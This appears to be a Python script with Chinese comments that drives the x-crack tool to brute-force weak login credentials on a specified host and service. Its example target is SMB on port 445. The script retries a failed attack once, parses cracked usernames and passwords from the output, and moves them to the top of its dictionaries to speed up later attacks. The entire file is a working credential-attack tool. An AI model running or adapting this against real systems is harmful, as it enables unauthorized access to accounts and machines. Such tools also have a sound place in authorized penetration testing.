# -*- coding: cp936 -*-
import os
import re
import logging
# log
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
handler = logging.FileHandler(os.path.basename(__file__)[:-3]+".log", mode='a')
formatter = logging.Formatter("%(asctime)s -  %(levelname)s - %(message)s")
handler.setFormatter(formatter)
logger.addHandler(handler)
# log

def PwdCrack(ip, port, serve, login='', pwd=''):
    '''
        功能:
            对给定的ip和具体服务进行弱口令爆破，其中，若爆破第一次不成功再爆破一次，并返回爆破结果。
            输入中可指定具体用户名和口令也可不指定，每次建立ssh连接超时时间默认为10秒钟。
        input:
            ip，端口号，服务协议(, 指定用户名, 口令)
        output:
            [ip,用户名,口令]
    '''
    iplist = 'iplist.txt'
    loginlist = 'user.dic'
    passwordlist = 'pass.dic'

    ip_port_serve= '{0}:{1}|{2}'.format(ip, port, serve)
    if os.path.exists(iplist):
        os.remove(iplist)
    with open(iplist, 'w+') as f:
        f.writelines(ip_port_serve)
    if login:
        newdic = 'spuser.dic'
        with open(newdic, 'w+') as f:
            f.writelines(login)
        loginlist = newdic
    if pwd:
        newdic = 'sppwd.dic'
        with open(newdic, 'w+') as f:
            f.writelines(pwd)
        passwordlist = newdic
    ip_cmd = '-i {0}'.format(iplist)
    login_cmd = '-u ' + loginlist
    pwd_cmd = '-p {0}'.format(passwordlist)
    splitline = '-'*30
    cmd = ' '.join(['./x-crack-linux32', 'scan', ip_cmd, login_cmd, pwd_cmd]).strip()
    re_cmp = 'Ip: (?P<ip>.+?), Port: {0}, Protocol: \\[{1}\\], Username: (?P<user>.+?), Password: (?P<pass>.+?)\n'.format(port, serve.upper())
    logger.info(splitline+'开始首次爆破'+splitline)
    user_pass = executeXCrack(cmd, re_cmp)
    if user_pass:
        logger.info(splitline+'首次爆破成功'+splitline)
    else:
        logger.info(splitline+'首次爆破未成功，开始第二次爆破'+splitline)
        user_pass = executeXCrack(cmd, re_cmp)
        if not user_pass:
            logger.info(splitline+'第二次爆破失败，程序退出'+splitline)
            user_pass = ''
        else:
            logger.info(splitline+'第二次爆破成功'+splitline)
    if login:
        os.remove(loginlist)
    if pwd:
        os.remove(passwordlist)
    loginlist = 'user.dic'
    passwordlist = 'pass.dic'
    for cc in user_pass:
        insertlist(cc[1], loginlist)
        insertlist(cc[2], passwordlist)

    return user_pass


def executeXCrack(cmd, cmp):
    '''
        功能:
            执行爆破命令，筛选爆破出的用户名和口令
        input:
            执行x-crack命令，匹配模式
        output:
            筛选结果
    '''
    r = os.popen(cmd).read()
    logger.info('输出结果：{0}'.format(r))
    cmp_obj = re.compile(cmp)
    user_pass = cmp_obj.findall(r)

    logger.info('爆破结果：', user_pass)
    return user_pass


def insertlist(value, diclist):
    """
        功能:
            将爆破出的用户名和弱口令移至字典的最前面,方便下一次爆破
        input:
            需要插入的值, 字典路径
        output:
    """
    with open(diclist, 'r+') as f:
        newf = f.readlines()
        for fr in newf:
            if fr == value+'\n':
                id = newf.index(fr)
                newf = newf[:id] + newf[id+1:]
                break
        f.seek(0, 0)
        f.writelines(value+'\n')
        f.writelines(newf)


if __name__ == '__main__':
    login = 'scx'
    port = '445'
    ip = '192.168.222.136'
    serve = 'smb'
    rs = PwdCrack(ip, port, serve)
    logger.info(rs)